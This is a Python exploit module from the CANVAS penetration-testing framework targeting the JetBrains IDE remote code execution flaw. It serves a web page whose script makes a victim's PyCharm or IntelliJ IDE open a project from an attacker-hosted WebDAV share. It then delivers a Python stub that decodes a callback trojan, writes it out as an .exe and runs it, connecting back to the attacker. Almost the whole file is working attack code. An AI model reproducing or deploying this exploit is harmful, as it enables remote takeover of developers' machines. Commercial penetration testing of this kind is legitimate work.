#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2010
# http://www.immunityinc.com/CANVAS/ for more information

import sys
import base64
import logging
import random

if "." not in sys.path: sys.path.append(".")

from httpclientside import *
from libs.spkproxy import header, body
from libs.canvasos import canvasos


NAME                                = "jetbrains_rce"
DESCRIPTION                         = "Jetbrains IDE's RCE"
DOCUMENTATION                       = {}
DOCUMENTATION["VENDOR"]             = "Jetbrains"
DOCUMENTATION["Date public"]        = "05/11/2016"
DOCUMENTATION["References"]         = [
    "http://blog.jetbrains.com/blog/2016/05/11/security-update-for-intellij-based-ides-v2016-1-and-older-versions/",
    "http://blog.saynotolinux.com/blog/2016/08/15/jetbrains-ide-remote-code-execution-and-local-file-disclosure-vulnerability-analysis/"
]
DOCUMENTATION["Repeatability"]      = "Infinite"
DOCUMENTATION["VersionsAffected"]   = "Windows XP, Windows 2003, Windows Vista, Windows 2008, Windows 7"
DOCUMENTATION["Notes"]              = """

The Pycharm exploit assumes Python 2.7 installed on the target, if you want to change it you can modify
Resources/projects/pycharm/.idea/misc.xml

"""

VERSION                 = "1.0"

PROPERTY                = {}
PROPERTY["TYPE"]        = "Exploit"
PROPERTY["SITE"]        = "Clientside"
PROPERTY["ARCH"]        = [["Windows"]]
PROPERTY["VERSION"]     = ["XP", "2003", "7"]
PROPERTY["DELIVERY"]    = "HTTP"

targets = {
    0: ["N/A", None, 0],
    1: ["Windows", "en-us", 0],
    #  Name       language       Get Stack           kernel32!VirtualProtect
}


def get_folder_resources(path):
    if os.path.exists(path):
        return os.listdir(path)
    else:
        return []

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.setInfo(DESCRIPTION)

        self.version = 0
        self.name = NAME
        self.is_running = False
        self.webdav_folder = os.path.join(os.path.dirname(__file__), 'Resources', 'projects')
        self.handles_options = True

        # Pick a random share name
        self.share_name = "%d" % random.randint(0, 10000)
        self.trojan_name = 'trojan.exe'
        self.refresh_rate = 480

        # Edit this if the target has a different python path
        self.python_path="C:\\python27\\python.exe"

        wst_path = os.path.join(self.webdav_folder, "pycharm", ".idea", "workspace_template.xml")
        ws_path = os.path.join(self.webdav_folder, "pycharm", ".idea", "workspace.xml")
        ws_data = None
        with open(wst_path, "rb") as handle:
            ws_data = handle.read()

        ws_data = ws_data.replace("%PYTHON_PATH%", self.python_path)
        with open(ws_path, "wb") as handle:
            handle.write(ws_data)

        self.content_type = {'.xml': "<D:getcontenttype>application/xml</D:getcontenttype>",
                             '.py': "<D:getcontenttype>text/x-python</D:getcontenttype>",
                             'default': "<D:getcontenttype>application/octet-stream</D:getcontenttype>"
        }


        self.EXPLOIT_HTML = """
                <html>
                    <script>
                        var xhttp = new XMLHttpRequest();
                        xhttp.onreadystatechange = function() {
                          if (this.readyState == 4 && this.status == 200) {
                            if (this.response.indexOf("PyCharm") > 0){
                               var xhr_trigger = new XMLHttpRequest();
                               xhr_trigger.open("POST", "http://127.0.0.1:63342/api/internal", true);
                               xhr_trigger.send('{"url": "jetbrains://whatever/open/{PYCHARM_PATH}"}');
                            }
                            else if (this.response.indexOf("IDEA") > 0){
                               var xhr_trigger = new XMLHttpRequest();
                               xhr_trigger.open("POST", "http://127.0.0.1:63342/api/internal", true);
                               xhr_trigger.send('{"url": "jetbrains://whatever/open/{IDEA_PATH}"}');
                             }
                          }
                        };
                        xhttp.open("GET","http://127.0.0.1:63342/api/about?more=true", true);
                        xhttp.send();
                    </script>
                </html>"""

        self.PROPFIND_FILE_BODY = """<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
             <D:href>{url}/{filename}</D:href>
             <D:propstat>
             <D:prop>
             <lp1:resourcetype/>
            <lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
             <lp1:getcontentlength>{length}</lp1:getcontentlength>
             <lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
             <lp1:getetag>"1000-53d07a9e271f4"</lp1:getetag>
            <lp2:executable>T</lp2:executable>"
            <D:supportedlock>
            <D:lockentry>
            <D:lockscope><D:exclusive/></D:lockscope>
            <D:locktype><D:write/></D:locktype>
            </D:lockentry>
            <D:lockentry>
            <D:lockscope><D:shared/></D:lockscope>
            <D:locktype><D:write/></D:locktype>
            </D:lockentry>
            </D:supportedlock>
            <D:lockdiscovery/>
            {content_type}
            </D:prop>
            <D:status>HTTP/1.1 200 OK</D:status>
            </D:propstat>
            </D:response>"""

        self.PROPFIND_DIR_BODY = """<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
            <D:href>%s/%s</D:href>
            <D:propstat>
            <D:prop>
            <lp1:resourcetype><D:collection/></lp1:resourcetype>
            <lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
            <lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
            <lp1:getetag>"1000-53d07a9e271f4"</lp1:getetag>
            <D:supportedlock>
            <D:lockentry>
            <D:lockscope><D:exclusive/></D:lockscope>
            <D:locktype><D:write/></D:locktype>
            </D:lockentry>
            <D:lockentry>
            <D:lockscope><D:shared/></D:lockscope>
            <D:locktype><D:write/></D:locktype>
            </D:lockentry>
            </D:supportedlock>
            <D:lockdiscovery/>
            <D:getcontenttype>httpd/unix-directory</D:getcontenttype>
            </D:prop>
            <D:status>HTTP/1.1 200 OK</D:status>
            </D:propstat>
            </D:response>"""

        self.XML_HEADER = """<?xml version="1.0" encoding="utf-8"?>
                <D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">"""

        self.XML_TRAILER = "</D:multistatus>"

    def run(self):
        self.unc_path = "\\\\\\\\\\\\\\\\" + str(self.callback.ip) + "@%d\\\\\\\\%s\\\\\\\\" % (self.getServerPort(), self.share_name)
        self.idea_unc_path = self.unc_path + "idea"
        self.pycharm_unc_path = self.unc_path + "pycharm"

        if not self.registerWebDavDirectory(self.share_name):
            logging.critical("Unable to register WebDAV directory! Exiting...")
            return False

        self.is_running = True

        return True

    def resp_403(self):
        h = header("SERVER")
        b = body()
        h.status = "403"
        h.msg = "Forbidden"
        h.addHeader("Content-Type", "text/html")
        b.setBody("")

        return h, b

    def resp_404(self):
        h = header("SERVER")
        b = body()
        h.status = "404"
        h.msg = "Not Found"
        h.addHeader("Content-Type", "text/html")
        b.setBody("")

        return h, b

    def resp_207(self, content_body):
        h = header("SERVER")
        b = body()
        h.status = "207"
        h.msg = "Multi-Status"
        h.addHeader("Content-Type", 'text/xml; charset="utf8"')
        b.setBody(content_body)

        return h, b

    def makesploit(self, clientheader, clientbody):
        if not self.is_running:
            self.run()

        if clientheader.verb == "OPTIONS":
            return self.do_options(clientheader, clientbody)
        elif clientheader.verb == "PROPFIND":
            return self.do_propfind(clientheader, clientbody)
        elif clientheader.verb in ["GET", "POST"]:
            return self.do_get(clientheader, clientbody)
        elif clientheader.verb == "PUT":
            logging.warning("Forbidden request method (%s)" % clientheader.verb)
            return self.resp_403()
        else:
            logging.warning("Invalid request method (%s)" % clientheader.verb)
            return self.resp_404()

    def create_trojan(self):
        t_os = canvasos('WINDOWS')
        t_os.arch = 'X86'

        trojan = self.buildmosdeftrojan(self.callback.ip,
                                        self.callback.port,
                                        t_os,
                                        universal=True,
                                        win8_compatible=True)

    def make_exploit(self):
        encoded_trojan = base64.b64encode(self.mosdeftrojan)
        exploit = "import os\n"
        exploit += "import base64\n"
        exploit += "import tempfile\n"
        exploit += "the_file = tempfile.NamedTemporaryFile('wb', delete=False)\n"
        exploit += "the_file.write(base64.b64decode('%s'))\n" % str(encoded_trojan)
        exploit += "the_file.close()\n"
        exploit += "the_file_new_name = the_file.name + '.exe'\n"
        exploit += "os.rename(the_file.name, the_file_new_name)\n"
        exploit += "os.startfile(the_file_new_name)\n"

        return exploit

    def do_get(self, clientheader, clientbody):
        """
        Process a GET request from the client.
        """
        h = header("SERVER")
        b = body()

        resource_name = self.get_resource_name(clientheader.URL)
        resources_folder = os.path.join(self.webdav_folder,
                                        os.path.dirname(resource_name))

        filename = os.path.basename(resource_name)
        if filename == 'exploit.py':
            self.create_trojan()
            content = self.make_exploit()
            b.setBody(content)
            h.addHeader("Content-Type", "application/octet-stream")
        elif filename in get_folder_resources(resources_folder):
            resource_path = os.path.join(self.webdav_folder, resource_name)
            with file(resource_path, 'rb') as resource_fd:
                b.setBody(resource_fd.read())
            h.addHeader("Content-Type", "application/octet-stream")
        else:
            html_body = self.EXPLOIT_HTML.replace("{PYCHARM_PATH}", self.pycharm_unc_path).replace("{IDEA_PATH}", self.idea_unc_path)

            h.addHeader("Content-Type", "text/html")
            b.setBody(html_body)

        return h, b

    def do_options(self, clientheader, clientbody):
        h = header("SERVER")
        b = body()

        h.addHeader("Content-Type", "text/xml")
        h.addHeader("DAV", "1, 2")
        h.addHeader("Public", "OPTIONS, GET, PROPFIND")
        h.addHeader("Allow", "OPTIONS, GET, PROPFIND")

        # h.status = "207"
        # h.msg = "Multi-Status"
        h.status = "200"
        h.msg = "OK"

        b.setBody("")

        devlog("JETBRAINS", h.printme())

        return h, b

    def get_resource_name(self, url):
        root = os.path.join('/', self.share_name)
        return os.path.relpath(url, root).lower()

    def do_propfind(self, clientheader, clientbody):
        """
        All the needed information is here:
        http://www.webdav.org/specs/rfc2518.html

        The PROPFIND method retrieves properties defined on the resource identified by the Request-URI
        """
        resource_name = self.get_resource_name(clientheader.URL)
        resources_folder = os.path.join(self.webdav_folder,
                                        os.path.dirname(resource_name))
        filename = os.path.basename(resource_name)

        logging.info('Requested resource: %s' % resource_name)

        if filename not in get_folder_resources(resources_folder) and resource_name != '.':
            return self.resp_404()

        depth = int(clientheader.getHeaderValue("Depth"))

        if  depth > 0:
            logging.info('Listing files')
            content_body = self.do_propfind_listing(clientheader)
        else:
            logging.info('%s found' % resource_name)

            resource_path = os.path.join(self.webdav_folder, resource_name)
            if os.path.isdir(resource_path):
                content_body = self.do_propfind_dir(clientheader.URL, listing=False)
            else:
                file_length = os.path.getsize(os.path.join(self.webdav_folder, resource_name))
                content_body = self.do_propfind_file(url=clientheader.URL,
                                                     filename=resource_name,
                                                     length=file_length,
                                                     listing=False)
        return self.resp_207(content_body)

    def do_propfind_listing(self, clientheader):
        resource_name = self.get_resource_name(clientheader.URL)
        resource_path = os.path.join(self.webdav_folder, resource_name)
        files = ''

        content_body = self.XML_HEADER

        content_body += self.do_propfind_dir(clientheader.URL)

        for subresource_name in get_folder_resources(resource_path):
            logging.info('Adding %s' % subresource_name)
            subresource_path = os.path.join(resource_path, subresource_name)
            if os.path.isdir(subresource_path):
                files += self.do_propfind_dir(url=clientheader.URL,
                                              dirname=subresource_name,
                                              listing=True)
            else:
                file_length = os.path.getsize(subresource_path)
                files += self.do_propfind_file(url=clientheader.URL,
                                               filename=subresource_name,
                                               length=file_length,
                                               listing=True)

        content_body += files
        content_body += self.XML_TRAILER

        return content_body

    def do_propfind_dir(self, url, dirname='', listing=True):
        content_body = self.XML_HEADER if not listing else ''
        content_body += self.PROPFIND_DIR_BODY % (url, dirname)
        content_body += self.XML_TRAILER if not listing else ''

        return content_body

    def do_propfind_file(self, url, filename, length, listing):
        file_extension = os.path.splitext(filename)[1]
        content_values = {'url': url,
                          'filename': filename,
                          'length': length,
                          'content_type': self.content_type.get(file_extension,
                                                                self.content_type.get('default'))
                          }

        content_body = self.XML_HEADER if not listing else ''

        body = self.PROPFIND_FILE_BODY
        for (name, value) in content_values.iteritems():
            body = body.replace("{%s}" % name, str(value))

        content_body += body
        content_body += self.XML_TRAILER if not listing else ''

        return content_body

    def is_vulnerable(self, info_dict):
        return 1


# For running the exploit on the command line
if __name__ == "__main__":
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
